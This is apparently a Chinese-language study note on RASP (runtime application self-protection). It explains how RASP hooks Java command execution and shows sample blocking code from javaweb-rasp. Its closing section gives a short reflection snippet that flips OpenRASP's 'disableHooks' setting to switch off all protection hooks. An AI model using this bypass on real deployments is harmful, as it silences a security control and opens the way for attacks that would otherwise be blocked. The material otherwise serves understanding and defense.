前置基础
---

**简介**

Runtime Application Self-protection (RASP) is a security technology that is built or linked into an application or application runtime environment, and is capable of controlling application execution and detecting and preventing real-time attacks. 

by Gartner

**理解何为 自我保护**

栗子（命令执行漏洞）：

WAF、IDS等的安全设备是基于 攻击特征 进行检测 & 拦截，非常依赖于规则（只能阻断已知漏洞攻击）。

而在RASP技术中，应用程序则清楚自己执行了哪些代码，调用了哪些Java API，执行了哪些命令，所以针对该类型的漏洞只需要在涉及的API之前插入防御逻辑即可（可以阻断未知漏洞）。

示例 - Java命令执行的调用栈

```bash
create:-1, ProcessImpl (java.lang)
<init>:386, ProcessImpl (java.lang)
start:137, ProcessImpl (java.lang)
start:1029, ProcessBuilder (java.lang)
exec:620, Runtime (java.lang)
exec:450, Runtime (java.lang)
exec:347, Runtime (java.lang)
main:6, CE01 (CommandExecution.Runtime)
```

示例 - RASP防御本地系统命令执行检测代码

- https://github.com/javasec/javaweb-rasp

```bash
/**
 * RASP防御本地系统命令执行示例
 * Creator: yz
 * Date: 2019-07-23
 */
public class LocalCommandHookHandler {

   private static final HookResult<?> BLOCK_RESULT = new HookResult<Object>(THROW, new RASPHookException(cmdType));

   /**
    * 本地命令执行拦截模块，如果系统执行的CMD命令和请求参数完全一致则直接拦截
    *
    * @param command 执行的系统命令
    * @param event   Hook事件
    * @return Hook处理结果
    */
   public static HookResult<?> processCommand(List<String> command, MethodHookEvent event) {
      String[] commands = command.toArray(new String[0]);

      // 如果当前线程中不包含HTTP请求则不需要检测
      if (event.hasRequest()) {
         RASPHttpRequestContext context       = event.getRASPContext();
         RASPCachedRequest      cachedRequest = context.getCachedRequest();

         // 检测当前请求是否需要经过安全模块检测和过滤且该模块是否是开启状态
         if (!context.mustFilter(cmdType)) {
            return DEFAULT_HOOK_RESULT;
         }

         Set<RASPCachedParameter> cachedParameters = cachedRequest.getCachedParameter();

         // 只过滤请求参数值，忽略请求参数名称，因为参数名出现命令执行的概率太低
         for (RASPCachedParameter parameterValue : cachedParameters) {
            // 请求参数名称
            String key = parameterValue.getKey();

            // 请求参数值
            String[] values = parameterValue.getValue();

            // 请求参数出现的位置
            RASPParameterPosition position = parameterValue.getRaspAttackPosition();

            // 遍历所有的参数值
            for (String value : values) {
               if (StringUtils.isEmpty(value)) {
                  continue;
               }

               // 遍历被执行的系统命令
               for (String cmd : commands) {
                  if (value.equals(cmd)) {
                     // 添加攻击日志记录
                     context.addAttackInfo(new RASPAttackInfo(cmdType, key, commands, position, event, true));

                     return BLOCK_RESULT;
                  }
               }
            }
         }

      }

      return DEFAULT_HOOK_RESULT;
   }

}
```

研究利用
---

### OpenRASP 代码执行 Bypass
> by: potats0

- 原因：安全机制在性能消耗上的让步
- 实现：通过代码执行反射开启"禁用所用hook点"的feature

```java
try{
   Class clazz = Class.forName("com.baidu.openrasp.config.Config");
   Method m = clazz.getMethod("getConfig", null);
   Object o = m.invoke(null, null);
   Field disableHooksF = o.getClass().getDeclareField("disableHooks");
   disableHooksF.setAccessible(true);
   disableHooksF.set(o, true);
}catch(Exception e){
   e.printStackTrace();
}
```
